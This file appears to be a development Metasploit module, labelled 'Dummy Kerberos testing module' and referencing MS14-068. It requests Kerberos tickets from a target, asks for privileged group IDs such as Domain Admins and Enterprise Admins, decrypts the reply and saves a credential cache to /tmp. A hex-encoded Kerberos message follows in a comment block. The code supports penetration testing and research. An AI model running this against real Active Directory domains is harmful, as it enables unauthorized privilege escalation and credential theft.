##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class Metasploit4 < Msf::Auxiliary

  #include Msf::Exploit::Remote::Kerberos::Client
include Msf::Kerberos::Microsoft::Client

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Dummy Kerberos testing module',
      'Description' => %q{
        Dummy Kerberos testing module
      },
      'Author' =>
        [
					'juan vazquez'
        ],
      'References' =>
        [
          ['MSB', 'MS14-068']
        ],
      'License' => MSF_LICENSE,
      'DisclosureDate' => 'Dec 25 2014'
    ))
  end

  def run

    opts = {
      cname: 'juan',
      sname: 'krbtgt/DEMO.LOCAL',
      realm: 'DEMO.LOCAL',
      key: OpenSSL::Digest.digest('MD4', Rex::Text.to_unicode('juan'))
    }

		connect(:rhost => datastore['RHOST'])
    print_status("Sending AS-REQ...")
		res = send_request_as(opts)
		print_status("#{res.inspect}")

    unless res.msg_type == 11
      print_error("invalid response :(")
      return
    end

    print_good("good answer!")
    print_status("Parsing AS-REP...")

    session_key = extract_session_key(res, opts[:key])
    pp session_key
    logon_time = extract_logon_time(res, opts[:key])

    print_status("logon time: #{logon_time}")
    ticket = res.ticket

    opts.merge!(
      logon_time: logon_time,
      session_key: session_key,
      ticket: ticket,
      group_ids: [513, 512, 520, 518, 519],
      domain_id: 'S-1-5-21-1755879683-3641577184-3486455962'
    )
    print_status("Sending TGS-REQ...")
    res = send_request_tgs(opts)

    unless res.msg_type == 13
      print_error("invalid response :(")
      return
    end

    print_good("Valid TGS-Response")

    pp res

    decrypt_res = res.enc_part.decrypt("AAAABBBBCCCCDDDD", 9)
    enc_res = Rex::Proto::Kerberos::Model::EncKdcResponse.decode(decrypt_res)

    print_good("Decrypted!")
    pp enc_res

    client = create_cache_principal(
      name_type: res.cname.name_type,
      realm: res.crealm,
      components: res.cname.name_string
    )

    server = create_cache_principal(
      name_type: enc_res.sname.name_type,
      realm: enc_res.srealm,
      components: enc_res.sname.name_string
    )

    key = create_cache_key_block(
      key_type: enc_res.key.type,
      key_value: enc_res.key.value
    )

    times = create_cache_times(
      auth_time: enc_res.auth_time,
      start_time: enc_res.start_time,
      end_time: enc_res.end_time,
      renew_till: enc_res.renew_till
    )

    credential = create_cache_credential(
      client: client,
      server: server,
      key: key,
      time: times,
      ticket: res.ticket.encode,
      flags: enc_res.flags
    )

    cache_principal = create_cache_principal(
      name_type: 1, # NT_PRINCIPAL
      realm: opts[:realm],
      components: [opts[:cname]]
    )

    cache = create_cache(
      primary_principal: cache_principal,
      credentials: [credential]
    )

    print_good("cache created")

    pp cache

    f = File.new('/tmp/cache.ticket', 'wb')
    f.write(cache.encode)
    f.close
  end
end

=begin
"\x61\x82\x03\x81\x30\x82\x03\x7d\xa0\x03\x02\x01\x05\xa1\x0c\x1b\x0a\x44\x45\x4d" +
"\x4f\x2e\x4c\x4f\x43\x41\x4c\xa2\x1f\x30\x1d\xa0\x03\x02\x01\x01\xa1\x16\x30\x14" +
"\x1b\x06\x6b\x72\x62\x74\x67\x74\x1b\x0a\x44\x45\x4d\x4f\x2e\x4c\x4f\x43\x41\x4c" +
"\xa3\x82\x03\x45\x30\x82\x03\x41\xa0\x03\x02\x01\x17\xa1\x03\x02\x01\x02\xa2\x82" +
"\x03\x33\x04\x82\x03\x2f\xa3\xda\x11\xc3\xd7\x35\x06\x8f\x70\x67\x52\x08\x71\xce" +
"\xf7\x28\xab\x39\x82\x2c\x1b\x8f\x35\x58\x32\xff\x85\x18\x16\x20\x6d\xa1\x38\xb3" +
"\x2f\x2f\xc8\x51\x19\x27\x94\x11\xeb\xa2\xa7\xfa\x27\xd0\x50\x72\x93\xb6\x63\x17" +
"\x3d\xf5\xf9\x9c\x6c\xc6\xbe\x81\xf3\xf7\x9c\xd0\xb3\xbc\xd1\x01\x9c\x82\x64\x69" +
"\x02\x1b\xa1\x36\xe2\x75\xec\xfd\xb8\x77\x53\x20\x36\x74\x93\x54\xa1\x18\xbd\xdb" +
"\xfe\x38\x61\x2b\x37\xde\x4f\xbe\x22\x7b\xc5\x79\x91\x6e\xd0\x58\x72\x87\x91\xd2" +
"\x65\x7f\xf6\xbe\x6c\xf3\x68\x46\x21\x17\x4f\x5d\xb6\x1f\xc6\xc3\x0e\xf7\x95\xb9" +
"\xa8\x62\x9d\x3e\x8d\xcb\x19\xa0\x33\x89\x1d\xe6\xcc\x5e\xc9\x79\x33\x09\x3d\x35" +
"\x8d\x48\x06\x44\xbe\x37\x2e\xf1\xbb\xc3\xc9\xd8\xe8\xad\x75\x02\xf9\xa9\xe0\xd5" +
"\x56\xeb\xea\xb3\xd4\xa4\x84\x32\x50\xb5\x84\xc1\xcc\x56\x11\xc6\x0e\xe2\x21\xfc" +
"\x45\x8f\x53\xea\x79\xc1\x19\x49\x45\xe8\x4b\x90\xc6\x01\xfa\xf3\xa5\x8a\x97\x27" +
"\x32\x17\x9f\x00\xab\x85\x0c\x31\x79\xad\x18\x16\x91\x8c\xfb\x0d\xd6\xd7\x52\x98" +
"\x82\x5b\xcb\x16\x0c\x65\x40\x22\xa6\x7b\xad\xaa\xb6\xa3\xc1\xd9\xcc\xbb\xda\xae" +
"\x71\xe8\x4c\xab\x48\xaf\x43\x15\x52\xb2\xed\x75\x87\xe0\x96\x29\xd3\x3e\x0e\xfc" +
"\xc8\x0f\xc2\x24\x90\x73\xd2\xe3\xa7\xc4\x69\x3d\x1c\x05\xb7\x81\xd1\x1e\x1c\x63" +
"\xbc\x34\x3e\x4d\xe8\x63\x22\x28\x01\x6f\xc1\xf3\x35\xb9\xe6\xe0\x4f\xe3\x94\xcf" +
"\x67\x14\x20\x8b\x33\xcc\x2e\x5f\xd6\x14\x5b\x15\x34\x56\x64\x9a\xba\xa9\x62\x1a" +
"\xb5\x80\xf4\x60\x34\xaf\x86\x9d\x5b\x84\x5a\x28\xbb\x6c\x30\xaa\x4a\xad\xf8\x73" +
"\x19\x14\x92\x53\x83\x78\x9e\xb0\xe0\x5f\x69\xa6\x96\xe6\x57\xe4\x20\x0b\x96\x87" +
"\xe9\x16\x2c\xba\x9d\x33\x02\xe6\xb6\xb3\x51\xee\xee\x68\x79\x36\xd1\x79\xc3\x1f" +
"\xb5\xda\x3a\xe6\x5b\x21\x46\x6e\xac\x6a\x61\xbb\xb3\x6f\x46\x69\xbf\xdc\xa8\x9c" +
"\x1a\x5c\x87\x14\x40\x5f\xc4\x39\x11\x2b\xf7\xac\xf9\x55\x2c\x62\xe3\x31\xc9\x8e" +
"\x21\x69\xb3\x10\x28\xa6\xeb\xd3\x00\xe8\x9a\xe2\x53\xa4\xe6\x3c\xcb\xa3\x6c\xf4" +
"\x6e\x7f\x5e\x3f\x36\xa6\xaa\x25\x6a\x90\x67\xaf\xd7\xf8\x4f\x99\x83\xee\x53\xd0" +
"\xcd\x8f\xb8\xa9\xd1\x5b\x81\x0e\x28\x07\x8a\x0d\xce\x70\xaf\x19\xe4\x03\x33\xe2" +
"\x1c\x25\xb1\x35\x55\x8b\xd4\x60\xcf\xf3\x64\x21\xa5\x75\x49\x93\xca\x44\xb3\x57" +
"\x89\x37\x23\x22\x90\x27\x63\x60\xf8\x5d\x54\x15\x39\x48\x16\x62\xff\x52\x57\x06" +
"\xed\x81\x7f\xa8\x4a\xa7\xbb\xbd\xed\x2e\x4f\xdf\x34\x60\x09\xf0\x3e\x45\xf8\x9d" +
"\xd7\x13\x71\x53\x3f\x36\x7e\x01\xd1\x0a\xef\xfb\xeb\x75\x7f\xce\x82\x5e\x40\x2e" +
"\x0c\x84\xa2\xe3\x60\xc4\x94\x83\x4e\x2a\x54\x94\x41\xa8\xea\xd4\xc5\xd6\x6c\x2b" +
"\x33\xef\x31\xf8\x9c\x2c\xcd\xc7\x8a\xfc\xb2\xb4\xcc\x9a\xaf\x94\x9b\xf8\x26\xb7" +
"\x6c\x8e\xd8\x9f\x8b\x33\x22\x89\x95\xbd\x3e\x99\x01\x0f\xc3\xa5\x22\xef\xdb\x3b" +
"\xff\x16\xf7\x59\x33\xdf\x74\x8b\x10\x4b\xe0\x9f\xaa\x9f\x59\x8a\x7b\xf8\xd2\xd4" +
"\x0c\x95\xa3\xeb\xdc\x82\xb5\xc3\xd5\x07\x84\xe0\x34\xb7\x78\x56\x69\xca\x38\x36" +
"\x15\x70\x99\x49\xb1\x3c\x1e\xb2\xab\x94\xb4\x0e\xcc\x2a\x26\xd2\xeb\xd2\x9e\x13" +
"\x65\x8f\xdf\xa5\x6b\xd1\x49\x10\x74\x4d\x3a\x7e\xec\x34\xb5\x20\xdc\x92\xc6\x7c" +
"\x65\x89\x96\x2b\xc9\x6b\x2a\x73\x23\x2b\xbe\xfe\x88\xdc\xc5\x0f\x92\x83\x06\x1d" +
"\x66\x8c\xf9\x26\x57\xbf\x4c\x39\xe8\x3b\xf5\xd9\x5a\xc7\xfc\xec\xf8\xd3\x66\x50" +
"\x18\x9d\xf4\xdf\xcf\x8f\x1a\x71\x28\x22\xcf\x71\x16\x87\xb6\x04\xb9\x8c\xad\x31" +
"\x3b\xed\x78\x14\x97\xc7\xf3\xc4\xc7\xc7\x80\x83\x0f\xe2\xa7\x60\x38\xcb\x65\x26" +
"\xb9\x8e\xa1\x20\x49\x6b\x25\x04\x4f\x71\x0f\xdd\xa0\x70\xd4\xb3\xd1\x8b\x7e\x17\xcd"
=end